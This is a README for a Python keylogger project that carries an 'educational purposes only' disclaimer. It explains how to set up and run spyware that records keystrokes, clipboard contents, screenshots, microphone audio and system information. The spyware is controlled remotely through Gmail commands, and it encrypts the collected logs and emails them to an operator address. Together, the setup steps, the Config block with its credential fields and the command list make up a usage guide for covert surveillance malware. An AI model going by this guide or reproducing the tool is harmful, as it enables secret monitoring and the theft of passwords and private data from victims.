# Keylogger Project 🔐📝

Welcome to the **Keylogger Project**! This Python-based keylogger is designed for educational purposes to demonstrate system monitoring capabilities. It captures keystrokes, system information, clipboard data, screenshots, and audio, with features like email integration and encryption. 🚀

> **⚠️ Disclaimer**: This project is for **educational purposes only**. Unauthorized use of keyloggers is illegal and unethical. Ensure you have explicit permission before deploying this software.

## Table of Contents 📑
- [Features](#features-✨)
- [Prerequisites](#prerequisites-🛠️)
- [Installation](#installation-📦)
- [Configuration](#configuration-⚙️)
- [Usage](#usage-🚀)
- [Commands](#commands-📬)
- [Project Structure](#project-structure-📁)
- [Acknowledgements](#acknowledgements-🙏)

## Features ✨
- **Keystroke Logging**: Captures keyboard input with support for special keys (e.g., space, esc). 🖮
- **System Information**: Collects details like hostname, IP addresses, processor, and OS version. 💻
- **Clipboard Monitoring**: Records clipboard contents. 📋
- **Audio Recording**: Captures audio via microphone for a configurable duration. 🎙️
- **Screenshot Capture**: Takes desktop screenshots. 📸
- **Email Integration**: Sends logs via email (Gmail SMTP) and processes commands from incoming emails. 📧
- **Encryption**: Encrypts keylog files using Fernet symmetric encryption. 🔒
- **Thread Handling**: Uses threading for concurrent email checking and keylogging. 🧵
- **Command Queue**: Processes multiple commands from emails efficiently. 📬
- **File Cleanup**: Removes old log files based on age. 🗑️
- **Status Reporting**: Sends system status reports on demand. 📊
- **Robust Error Handling**: Comprehensive logging for debugging and monitoring. 🐞
- **Configurable Settings**: Centralized configuration via a dataclass. ⚙️

## Prerequisites 🛠️
Before running the keylogger, ensure you have:
- Python 3.8 or higher 🐍
- A Gmail account with an **App Password** for SMTP/IMAP access
- Windows OS (due to `win32clipboard` dependency) 🪟
- Required Python packages (listed below)

### Required Packages
```bash
pynput
scipy
sounddevice
Pillow
pywin32
requests
cryptography
schedule
```

## Installation 📦
1. **Clone the Repository**:
   ```bash
   git clone https://github.com/your-username/keylogger-project.git
   cd keylogger-project
   ```

2. **Install Dependencies**:
   ```bash
   pip install -r requirements.txt
   ```

   Or install individually:
   ```bash
   pip install pynput scipy sounddevice Pillow pywin32 requests cryptography schedule
   ```

3. **Set Up Gmail App Password**:
   - Enable 2-factor authentication in your Gmail account.
   - Generate an App Password at [Google Account Security](https://myaccount.google.com/security).
   - Update the `email_password` in the `Config` class of `keyloggers.py`.

## Configuration ⚙️
Edit the `Config` dataclass in `keyloggers.py` to customize settings:
```python
@dataclass
class Config:
    email_address: str = "your-email@gmail.com"  # Your Gmail address
    email_password: str = "your-app-password"    # Gmail App Password
    to_address: str = "recipient-email@gmail.com"  # Email to send logs
    key: bytes = b'your-encryption-key'          # Fernet encryption key
    file_path: str = "folder-where-you-want-to-store-logs-and-files"   # Log storage path
    keys_information: str = "key_log.txt"        # Keystroke log file
    system_information: str = "systeminfo.txt"   # System info file
    clipboard_information: str = "clipboard.txt" # Clipboard log file
    audio_information: str = "audio.wav"         # Audio file
    screenshot_information: str = "screenshot.png"  # Screenshot file
    max_retries: int = 3                         # Email retry attempts
    retry_delay: float = 5.0                     # Delay between retries
    audio_duration: int = 10                     # Audio recording duration (seconds)
    max_file_age_days: int = 7                   # Max age for log files
```

To generate a new encryption key:
```python
from cryptography.fernet import Fernet
key = Fernet.generate_key()
print(key)
```

## Usage 🚀
1. **Run the Keylogger**:
   ```bash
   python keyloggers.py
   ```

2. The keylogger will:
   - Create the specified log directory if it doesn't exist.
   - Collect initial system information.
   - Start monitoring for emails every minute.
   - Wait for commands via email or keyboard input (stops on ESC key).

3. **Control via Email**:
   Send emails from the `to_address` to the `email_address` with commands in the email body (case-insensitive).

## Commands 📬
Send these commands in the email body:
- `start`: Starts the keylogger. 🖮
- `stop`: Stops the keylogger, encrypts logs, and sends them via email. 🛑
- `screenshot`: Takes a screenshot and sends it. 📸
- `record`: Records audio for the configured duration and sends it. 🎙️
- `copy`: Captures clipboard contents and sends them. 📋
- `sysinfo`: Collects system information and sends it. 💻
- `cleanup`: Deletes log files older than `max_file_age_days`. 🗑️
- `status`: Sends a status report (running state, pending commands, etc.). 📊

Example email body:
```
start
screenshot
```

## Project Structure 📁
```
keylogger-project/
│
├── keyloggers.py        # Main keylogger script
├── README.md            # Project documentation
├── requirements.txt     # Python dependencies
├── key_log.txt          # Keystroke logs (generated)
├── systeminfo.txt       # System information (generated)
├── clipboard.txt        # Clipboard data (generated)
├── audio.wav            # Audio recordings (generated)
├── screenshot.png       # Screenshots (generated)
├── keylogger.log        # Runtime logs (generated)
```





## Acknowledgements 🙏
- Thanks to the open-source community for the amazing libraries used in this project! 🌟
- Inspired by educational resources on system monitoring and cybersecurity.

Happy coding, and use responsibly! 😊
